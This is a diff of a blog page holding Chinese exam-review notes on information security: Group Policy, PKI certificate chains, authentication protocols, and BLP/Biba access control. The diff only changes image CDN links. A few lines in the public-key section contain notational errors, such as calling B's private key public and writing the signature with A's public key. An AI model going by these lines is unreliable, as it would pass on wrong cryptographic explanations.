@@ -256,7 +256,7 @@
         </header>
 
         <div class="post-content">
-            <h1 id="Open-EXAM-Study"><a href="#Open-EXAM-Study" class="headerlink" title="Open EXAM Study"></a>Open EXAM Study</h1><h2 id="Chap2"><a href="#Chap2" class="headerlink" title="Chap2"></a>Chap2</h2><h3 id="PDCA模型"><a href="#PDCA模型" class="headerlink" title="PDCA模型"></a>PDCA模型</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012046574.webp" alt=""></p>
+            <h1 id="Open-EXAM-Study"><a href="#Open-EXAM-Study" class="headerlink" title="Open EXAM Study"></a>Open EXAM Study</h1><h2 id="Chap2"><a href="#Chap2" class="headerlink" title="Chap2"></a>Chap2</h2><h3 id="PDCA模型"><a href="#PDCA模型" class="headerlink" title="PDCA模型"></a>PDCA模型</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012046574.webp" alt=""></p>
 <p>计划(Plan)： 建立与组织总体战略、 目标和方针保持一致的信息安全管理方针、 策略， 通过风险评估建立控制目标和方式， <strong>制定风险处理计划</strong>。</p>
 <p>执行(Do)： 按照控制目标和方式实施信息安全管理， <strong>开展全员安全培训、 实施安全控制</strong>。</p>
 <p>检查(Check)： 对照信息安全管理体系的方针、 目标， 对信息安全管理进行监视和验证， <strong>评审ISMS的有效性和适当性</strong>。</p>
@@ -274,7 +274,7 @@
 <li>组策略</li>
 </ol>
 <h4 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h4><p>单点登录（Single Sign On, SSO）：用户只需要登录一次就可以访问所有相互信任的应用系统。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012142146.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012142146.png" alt=""></p>
 <p>上图中的SSO基于Kerberos协议，故又称Kerberos SSO。</p>
 <p>当然，也有基于其他协议实现的SSO，如SPNEGO SSO、CAS SSO。</p>
 <h4 id="全局目录"><a href="#全局目录" class="headerlink" title="全局目录"></a>全局目录</h4><p>全局编录/全局目录（Global Catalog, GC）：保存在一个或多个域控制器中的数据库（只读副本，存储对象属性集的）。记录了AD 中所有域对象的部分信息以及架构信息和配置信息的完整副本。</p>
@@ -287,7 +287,7 @@
 <p>设置多个GC可以减少用户查询的响应时间，但是会导致网络的复制通信量增加。</p>
 <h4 id="多主复制"><a href="#多主复制" class="headerlink" title="多主复制"></a>多主复制</h4><p>多主复制（Multi-master replication）：通过安装域控制器，就可以在整个网络环境中创建目录的多份副本。网络中任何地方发生的变化都会在整个网络中自动复制。</p>
 <h4 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h4><p>组策略（Group Policy, GP）：<strong>在初始化时应用于计算机或用户的配置设置</strong>。可在不同层次上定义控制规则。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012307077.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012307077.png" alt=""></p>
 <p>组策略是<strong>管理员针对于网络中的用户和计算机所作的一系列设置</strong>，可以 设置在站点、 域、 组织单元（如果是工作组计算机则设置在本机上）上， 使管理员可以集中控制程序， 网络资源及系统行为。</p>
 <h5 id="生效时机"><a href="#生效时机" class="headerlink" title="生效时机"></a>生效时机</h5><p>计算机和用户是仅有的接收组策略的活动目录对象类型。</p>
 <p>自动刷新：</p>
@@ -305,7 +305,7 @@
 </ul>
 <p>强制刷新：</p>
 <p>使用<code>gpupdate /force</code>命令强制刷新组策略，某些策略必须重新启动计算机或重新登录用户。</p>
-<h5 id="设置对象"><a href="#设置对象" class="headerlink" title="设置对象"></a>设置对象</h5><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012314957.png" alt="image-20220701231431852"></p>
+<h5 id="设置对象"><a href="#设置对象" class="headerlink" title="设置对象"></a>设置对象</h5><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012314957.png" alt="image-20220701231431852"></p>
 <p>在域中，可以对站点（Site）、域（Domain）、组织单元（OU）设置组策略。可将一个组策略链接到多个Site/Domain/OU，也可以将多个组策略链接到同一Site/Domain/OU。</p>
 <p>在工作组中，使用本地组策略对计算机进行设置。</p>
 <h5 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h5><h6 id="默认处理"><a href="#默认处理" class="headerlink" title="默认处理"></a>默认处理</h6><p>默认处理顺序：纵向处理，其设置顺序为</p>
@@ -317,11 +317,11 @@
 </ol>
 <p>排在处理顺序后面的的GPO优先级高（后面的覆盖前面的）。</p>
 <p>工作组成员只处理本地组策略对象。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012322190.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012354067.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012322190.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012354067.png" alt=""></p>
 <p>例1</p>
 <p>对于主机“ServerA”，其组策略应用顺序：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012326067.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012326067.png" alt=""></p>
 <p>对计算机Server A而言，</p>
 <p><strong>本地组策略对象</strong>：A6</p>
 <p>站点组策略对象：A3</p>
@@ -330,9 +330,9 @@
 <p>所以应用顺序为A6 $\rightarrow$ A3 $\rightarrow$ A1 $\rightarrow$ A2 $\rightarrow$ A4 $\rightarrow$ A5。</p>
 <p>例2</p>
 <p>对于组织单元“教学”和“服务器”，其组策略应用顺序：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207020025502.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207020025502.png" alt=""></p>
 <p>例3</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012343705.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207012343705.png" alt=""></p>
 <div class="table-container">
 <table>
 <thead>
@@ -388,13 +388,13 @@
 <li>Replace替换模式：只用计算机策略</li>
 <li>Merge合并模式：先用户策略、再计算机策略（计算机策略的优先级更高了）</li>
 </ul>
-<h2 id="Chap3"><a href="#Chap3" class="headerlink" title="Chap3"></a>Chap3</h2><h3 id="中间人攻击（不考）"><a href="#中间人攻击（不考）" class="headerlink" title="中间人攻击（不考）"></a>中间人攻击（不考）</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207020045702.png" alt=""></p>
+<h2 id="Chap3"><a href="#Chap3" class="headerlink" title="Chap3"></a>Chap3</h2><h3 id="中间人攻击（不考）"><a href="#中间人攻击（不考）" class="headerlink" title="中间人攻击（不考）"></a>中间人攻击（不考）</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207020045702.png" alt=""></p>
 <p>问题：Bob没有办法判断收到的公钥是否来自Alice</p>
 <p>解决方法：引入证书</p>
 <p>找到一个可信第三方验证主体</p>
 <p>把公钥和所有者身份绑定到证书中。</p>
 <p>证书不能被伪造（forged）或篡改（tampered）（使用数字签名）</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207020052164.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207020052164.png" alt=""></p>
 <p>安全通信过程：Alice需要获得可信第三方签名的证书。</p>
 <ol>
 <li>可信第三方给Alice颁发一个带有Alice身份信息和Alice公钥的证书</li>
@@ -424,9 +424,9 @@
 <h3 id="数字证书和证书验证"><a href="#数字证书和证书验证" class="headerlink" title="数字证书和证书验证"></a>数字证书和证书验证</h3><p>数字证书是一个经CA数字签名的包含<strong>公钥拥有者</strong>信息以及<strong>公钥</strong>的文件，还包括签名算法和用途。</p>
 <p>证书验证通过CA实现</p>
 <h4 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h4><p>基本结构</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021325527.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021325527.png" alt=""></p>
 <p>一般结构</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021206552.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021206552.png" alt=""></p>
 <p>根CA有自签名的证书</p>
 <p>根CA依次给下面的CA进行签名</p>
 <p>层次结构中的叶子节点CA对安全主体进行签名</p>
@@ -441,16 +441,16 @@
 <li>主体A从该证书的签发CA沿层次树向根找，可以构成一条证书链，直到<strong>找</strong>到该<strong>证书的根证书</strong></li>
 <li><strong>从根证书</strong>开始<strong>向叶验证</strong>（按证书链），直到验证到该证书的签名，如果证书链中所有证书的签名都验证通过（其中，根证书自签名，用自己的公钥进行验证），且主体A信任根CA，则主体A可以信任该证书。</li>
 </ol>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021234465.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021234465.png" alt=""></p>
 <h4 id="网状结构"><a href="#网状结构" class="headerlink" title="网状结构"></a>网状结构</h4><p>独立的CA双方交叉认证（也就是互相发放证书）， 结果是在对等的CA中产生了信任关系网。 信任仅存在于这两个CA及其下面的子CA之间。</p>
 <p>交叉验证指CA之间互相证明以建立一种横向信任关系， 这是一种对等信任模型．信任可以是单向也可以是双向的。<br>交叉验证为不同PKI实现相互集成提供了方便途径。</p>
 <p>基本结构</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021320649.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021320649.png" alt=""></p>
 <p>一般结构</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021321410.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021321410.png" alt=""></p>
 <h4 id="桥状结构"><a href="#桥状结构" class="headerlink" title="桥状结构"></a>桥状结构</h4><p>加一个CA连接两个CA，使它们成为P2P模式。</p>
 <p>一般结构</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021326424.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021326424.png" alt=""></p>
 <h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>证书真实性的验证基于<strong>证书链验证机制</strong>，其验证对象：（验证流程见层次验证例1）</p>
 <ol>
 <li>验证真实性。 证书是否为可信任CA认证中心签发？</li>
@@ -458,9 +458,9 @@
 <li>验证可用性。 证书是否已废除？</li>
 <li>验证证书结构中的证书用途。</li>
 </ol>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021329543.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021329543.png" alt=""></p>
 <p>例1 验证淘宝网站的证书</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021334689.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021334689.png" alt=""></p>
 <ol>
 <li>检查根CA（GlobalSign Root CA）的证书是否在浏览器的信任CA列表中（自签名的）</li>
 <li>用根CA（GlobalSign Root CA）的<strong>公钥</strong>验证中间CA（GlobalSign Organization Validation CA）的证书</li>
@@ -468,7 +468,7 @@
 <li>如果整个证书链的证书均验证成功，则淘宝网站的证书验证通过，信任淘宝网站（*.alibaba.com）</li>
 </ol>
 <h3 id="PKI的安全性"><a href="#PKI的安全性" class="headerlink" title="PKI的安全性"></a>PKI的安全性</h3><p>访问https网站时的认证过程</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021341323.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021341323.png" alt=""></p>
 <p>针对认证过程的攻击手段：</p>
 <ol>
 <li>对证书传输过程的攻击（中间人攻击）</li>
@@ -479,7 +479,7 @@
 </ol>
 <p>1 Hacker无法取得CA签发的证书，会创建顶层自签名证书example.com，而该证书不在浏览器信任范围内（不准确），就会导致不可信弹窗（继续前往！）。</p>
 <p>2 Hacker无法取得CA签发的证书，直接发送自己的证书hacker.com，浏览器检查不通过，终止握手协议MITM fails</p>
-<h2 id="Chap4"><a href="#Chap4" class="headerlink" title="Chap4"></a>Chap4</h2><h3 id="基于文本口令认证的安全机制"><a href="#基于文本口令认证的安全机制" class="headerlink" title="基于文本口令认证的安全机制"></a>基于文本口令认证的安全机制</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021358617.png" alt=""></p>
+<h2 id="Chap4"><a href="#Chap4" class="headerlink" title="Chap4"></a>Chap4</h2><h3 id="基于文本口令认证的安全机制"><a href="#基于文本口令认证的安全机制" class="headerlink" title="基于文本口令认证的安全机制"></a>基于文本口令认证的安全机制</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021358617.png" alt=""></p>
 <p>基于口令的机制允许人们选择自己的口令，并且不需要辅助设备生成或储存， 因此用户名加口令成为应用最广泛的一种身份认证方式。</p>
 <p>基于口令的认证虽然简单便捷、 费用低廉，但安全性上也存在风险。</p>
 <h4 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h4><ol>
@@ -511,7 +511,7 @@
 </ul>
 <h3 id="基于密码学的认证协议"><a href="#基于密码学的认证协议" class="headerlink" title="基于密码学的认证协议"></a>基于密码学的认证协议</h3><h4 id="基于对称密码的认证机制"><a href="#基于对称密码的认证机制" class="headerlink" title="基于对称密码的认证机制"></a>基于对称密码的认证机制</h4><p>实体A和B在开始具体运行认证机制之前应共享一个公共的秘密密钥$K_{AB}$。</p>
 <p>基于对称密码算法的鉴别机制可以没有第三方， 也可以有可信的第三方——通常称为KDC（Key Distrib-ution Center）用来进行密钥管理。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021726800.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021726800.png" alt=""></p>
 <p>A：声明方</p>
 <p>B：验证方</p>
 <h5 id="单次传递认证"><a href="#单次传递认证" class="headerlink" title="单次传递认证"></a>单次传递认证</h5><p>$M=TN_A||I_B$, $TN_A$为时间戳, $I_B$为可区分标识符，用于避免反射攻击</p>
@@ -526,19 +526,19 @@
 <p>加密算法：Encrypt, E</p>
 <h5 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h5><p>仅提供保密性，不能进行消息认证。</p>
 <p>A使用$PU_B$加密、B使用$PR_B$解密，这样只有B可以可以获取消息M，实现了保密性。但因为任何人都可以使用$PU_B$加密，所以不能保证消息由A发出（因为$PR_B$是公开的），即不能进行消息认证。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021733225.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021733225.png" alt=""></p>
 <h5 id="私钥加密"><a href="#私钥加密" class="headerlink" title="私钥加密"></a>私钥加密</h5><p>仅提供消息认证的三种安全服务，没有保密性。常用于签名。</p>
 <p>A使用$PR_A$加密，B使用$PU_A$解密，这样可以提供消息认证的三种安全服务（见下文）。但因为$PU_A$是公开的，所以任何人都可以获取消息M，即没有保密性。</p>
 <p>完整性：传输过程中未被篡改，否则格式会发生变化</p>
 <p>认证性：只有A可以发出$E_{PU_A}(M)$（因为$PR_A$是A私有的）</p>
 <p>抗抵赖性：所有人都可以使用PU_A验证M</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021732544.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021732544.png" alt=""></p>
 <h5 id="私钥-公钥加密"><a href="#私钥-公钥加密" class="headerlink" title="私钥-公钥加密"></a>私钥-公钥加密</h5><p>提供保密性和消息认证的三种服务。</p>
 <p>A先使用$PR_A$加密，再使用$PU_B$加密，B先使用$PR_B$解密，再使用$PU_A$解密。</p>
 <p>保密性：解密用到的$PR_B$为B私有，只有B能获取M</p>
 <p>完整性、认证性、抗抵赖性同上</p>
 <p>（其实我不太明白这种加密怎么实现抗抵赖性，另外先私后公加密可能是不希望密文被解开，解一层也不行）</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021734721.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207021734721.png" alt=""></p>
 <h4 id="基于MAC的认证机制"><a href="#基于MAC的认证机制" class="headerlink" title="基于MAC的认证机制"></a>基于MAC的认证机制</h4><p>消息验证码（Message Authentication Code, MAC）：利用共享密钥生成的定长数据块。</p>
 <h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ol>
 <li>固定长度</li>
@@ -602,7 +602,7 @@
 <p>file2: {(Alice, r), (Bob, r), (WorkGroup1, rwo)}</p>
 <p>file3: {(Alice, rwo), (WorkGroup1, w)}</p>
 <p>例1</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022111157.png" style="zoom:50%;" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022111157.png" style="zoom:50%;" /></p>
 <p>ntbackup: {…, (Domain Users,  rx), …}</p>
 <p>这种方法常用</p>
 <p>基于列压缩的访问控制还有基于保护位压缩（Linux权限管理，eg. drwxrwxrwx）、基于环压缩。</p>
@@ -612,7 +612,7 @@
 <p>WorkGroup1: {(file1, rx), (file2, rwo), (file3, w)}</p>
 <p>这种方法用的不多</p>
 <p>例2 下图攻击手段能成功实施的原因</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022126100.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022126100.png" alt=""></p>
 <p>Bob和Evil是计算机上的两个用户，其中Evil用户为hacker创建，未提权至Administrator权限。</p>
 <ol>
 <li><p>Evil对计算机上的一个程序2植入木马后运行程序2，创建木马进程，此时木马进程拥有者为Evil，无机密数据文件的r权限，所以该进程会创建一个暗袋文件，并赋予Bob x权限（因创建者是Evil所以其拥有rx权限）。</p>
@@ -622,17 +622,17 @@
 </ol>
 <p>原因：资源的拥有者自主管理资源权限</p>
 <p>例3 Windows中的DAC</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022138119.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022138119.png" alt=""></p>
 <h4 id="强制访问控制-基于规则的访问控制"><a href="#强制访问控制-基于规则的访问控制" class="headerlink" title="强制访问控制/基于规则的访问控制"></a>强制访问控制/基于规则的访问控制</h4><p>强制访问控制（Mandatory Access Control, MAC）又称基于规则的访问控制（Rule Based Access Control, RBAC）</p>
 <p>授权完全由主客体安全属性决定，其由系统控制，用户不能改变主客体的安全属性。</p>
 <h5 id="BLP模型"><a href="#BLP模型" class="headerlink" title="BLP模型"></a>BLP模型</h5><h6 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h6><p>贝拉（Bell-LaPadula）模型，又称<strong>机密性模型</strong></p>
 <p>规则：不上读，不下写</p>
 <p><strong>贝拉机密下毒</strong></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022150099.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022150099.png" alt=""></p>
 <p>安全级别：绝密（Top Secret, TS）、秘密（Secret, S）、机密（Confidential, C）、非保密（Unclassfied, U）</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022201049.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022201049.png" alt=""></p>
 <p>自主安全特性：类似于安全控制级别的访问控制矩阵</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022205629.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022205629.png" alt=""></p>
 <h6 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h6><p>简单安全规则（下读）：S的安全级别$\geq$O的安全级别，且S对O有读权限，可以下读。</p>
 <p>*规则（上写）：S的安全级别$\leq$O的安全级别，且S对O有写权限，可以上写。</p>
 <h6 id="安全级别标签"><a href="#安全级别标签" class="headerlink" title="安全级别标签"></a>安全级别标签</h6><p>安全级别标签是一个二元组(Level, Category)，eg. (TS, {财务处})</p>
@@ -640,22 +640,22 @@
 <p>例1 强制访问控制规则</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (S.L &gt;= O.L &amp;&amp; S.C &gt;= O.C)</span><br><span class="line">    <span class="built_in">Read</span>(S, O) 或 <span class="built_in">eXecute</span>(S, O)	<span class="comment">// 注意没有Write！</span></span><br></pre></td></tr></table></figure>
 <p>例2 防火墙中的BLP模型</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022217423.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022217423.png" alt=""></p>
 <p>即将内部网络的Level设为TS，将Internet的Level设为Unclassfied。</p>
 <p>例3 强制访问控制如何防止特洛伊木马的攻击</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022218341.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022218341.png" alt=""></p>
 <p>数据文件.L &gt;= 暗袋文件.L，信息只能上写，所以无法向暗袋文件写入数据。</p>
 <h5 id="Biba模型"><a href="#Biba模型" class="headerlink" title="Biba模型"></a>Biba模型</h5><h6 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h6><p>又称<strong>完整性模型</strong>。</p>
 <p><strong>比巴完整瞎写</strong></p>
 <h6 id="规则-1"><a href="#规则-1" class="headerlink" title="规则"></a>规则</h6><p>简单完整性规则（上读）：S的完整级别$\leq$O的完整级别，可以上读。</p>
 <p>*规则（下写）：S的完整级别$\geq$O的完整级别，可以下写。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022230213.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022230535.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022230213.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022230535.png" alt=""></p>
 <p>例1 防火墙中的Biba模型</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022232011.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207022232011.png" alt=""></p>
 <p>即将内部网络的Level设为TS，将Internet的Level设为Unclassfied。</p>
 <p>后两个不考</p>
-<h4 id="基于角色的访问控制"><a href="#基于角色的访问控制" class="headerlink" title="基于角色的访问控制"></a>基于角色的访问控制</h4><h4 id="基于属性的访问控制"><a href="#基于属性的访问控制" class="headerlink" title="基于属性的访问控制"></a>基于属性的访问控制</h4><h3 id="Windows分布式访问控制"><a href="#Windows分布式访问控制" class="headerlink" title="Windows分布式访问控制"></a>Windows分布式访问控制</h3><h4 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h4><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208192327333.png" alt=""></p>
+<h4 id="基于角色的访问控制"><a href="#基于角色的访问控制" class="headerlink" title="基于角色的访问控制"></a>基于角色的访问控制</h4><h4 id="基于属性的访问控制"><a href="#基于属性的访问控制" class="headerlink" title="基于属性的访问控制"></a>基于属性的访问控制</h4><h3 id="Windows分布式访问控制"><a href="#Windows分布式访问控制" class="headerlink" title="Windows分布式访问控制"></a>Windows分布式访问控制</h3><h4 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h4><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208192327333.png" alt=""></p>
 <p>身份认证和访问控制可能不在同一节点/域（虚线分隔）</p>
 <p>Subject  Attribute：主体属性</p>
 <p>Request Attribute：请求属性</p>
@@ -664,7 +664,7 @@
 <p>服务包含操作，操作需要权限，所以权限策略库要与身份认证节点解耦合、与访问控制实施模块解耦合、与服务解耦合。</p>
 <p>实际系统中用户基数大，不能存储每个User的身份及属性信息，所以需要使用Group进行组织。</p>
 <h4 id="权限授予"><a href="#权限授予" class="headerlink" title="权限授予"></a>权限授予</h4><p>分布式访问控制系统通过将User映射到Group实现跨域身份认证与权限分配，这是分布式访问控制最重要的操作。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208262157368.jpg" alt=""><br>注：老师给的图有错误，首先U-groups和G-groups写反了，箭头应代表箭头尾是箭头尖的成员，应该是G-groups和U-groups加入到L-group，也画反了。这里已更正。</p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208262157368.jpg" alt=""><br>注：老师给的图有错误，首先U-groups和G-groups写反了，箭头应代表箭头尾是箭头尖的成员，应该是G-groups和U-groups加入到L-group，也画反了。这里已更正。</p>
 <p>G-groups：全局组，用于组织域内用户访问Resource</p>
 <p>U-groups：通用组，用于组织跨域用户访问Resource</p>
 <p>L-group：域本地组，用于分配权限，是连接权限与Resource的中间件</p>
@@ -706,7 +706,7 @@
 <li>存储在创建它的域中，只能在这个域中复制，不会出现在GC中。</li>
 </ol>
 <p>例1 使用全局组进行单域管理</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210010832.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210010832.png" alt=""></p>
 <p>AGDLP规则：按$A\rightarrow G\rightarrow DL\leftarrow P$进行权限授予。</p>
 <p>A：Account，帐户</p>
 <p>G：Global，全局</p>
@@ -714,13 +714,13 @@
 <p>P：Permission，权限</p>
 <p>例2 通用组对多域管理的简化</p>
 <p>不使用通用组</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208200118579.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208200118579.png" alt=""></p>
 <p>使用通用组</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208200119579.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208200119579.png" alt=""></p>
 <h5 id="权限指派"><a href="#权限指派" class="headerlink" title="权限指派"></a>权限指派</h5><p>在非GC上可以创建用户、域本地组、全局组。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210030101.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210030101.png" alt=""></p>
 <p>在GC上可以创建用户、域本地组、全局组、通用组。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210031362.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210031362.png" alt=""></p>
 <p>粗粒度权限管理：对资源<strong>类型</strong>的权限指派</p>
 <p>细粒度权限管理：对资源<strong>实例</strong>的权限指派</p>
 <p><strong>例1 粗细粒度权限管理对比</strong></p>
@@ -739,31 +739,31 @@
 <p>以product1单个全局组为例进行一次实际的权限指派与验证。</p>
 <p>Step1  权限指派：</p>
 <p>粗粒度权限管理：在域中指派用户权限</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210055160.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210057635.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210056244.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210055160.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210057635.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210056244.png" alt=""></p>
 <p>将example.com的domain_users删除，即收回example.com上的域用户lisi的登录权利。</p>
 <p>细粒度权限管理：在资源上指派资源访问权限</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202208210051657.png" alt=""></p>
